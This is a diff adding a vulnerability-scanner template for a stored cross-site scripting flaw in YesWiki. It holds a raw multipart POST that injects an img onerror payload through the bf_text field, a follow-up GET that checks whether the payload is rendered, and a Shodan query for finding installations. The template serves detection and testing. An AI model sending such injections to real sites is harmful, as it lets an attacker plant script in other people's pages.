@@ -1,0 +1,72 @@
+id: yeswiki-stored-xss
+
+info:
+  name: YesWiki - Stored Cross-Site Scripting
+  author: arafatansari
+  severity: high
+  description: |
+    YesWiki contains a stored contains a cross-site scripting vulnerability via the bf_text field when adding a new entry for Forum.
+  reference:
+    - https://huntr.dev/bounties/5f27a9b1-c092-47e2-8092-a81298a4b932/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+    cpe: cpe:2.3:a:yeswiki:cercopitheque:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.html:"yeswiki"
+    product: cercopitheque
+    vendor: yeswiki
+  tags: yeswiki,xss,stored-xss,huntr,intrusive
+
+http:
+  - raw:
+      - |
+        POST /?BazaR&vue=saisir&action=saisir_fiche&id=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT8dS2PT0WtxACLyu
+
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_titre"
+
+        blog
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_text"
+
+        "><img src=x onerror=console.log(123);>
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="file"; filename=""
+        Content-Type: application/octet-stream
+
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_description"
+
+        abcd
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="fichierbf_file"; filename=""
+        Content-Type: application/octet-stream
+
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="antispam"
+
+        1
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="id_typeannonce"
+
+        2
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu--
+      - |
+        GET /?BazaR&vue=consulter HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(header_2, 'text/html') && contains(header_2, 'YesWiki')"
+          - "status_code_2 == 200"
+          - contains(body_2, '><img src=x onerror=console.log(123);>')
+        condition: and
+# digest: 4b0a00483046022100978aa2a9060a7a9ed12ce260eac7fa4ce8804488b427487287e9587af7e850b7022100cff79ccaea004855e484afd651f9eeac046c5711e387bd1f8978da432517e690:922c64590222798bb761d5b6d8e72950
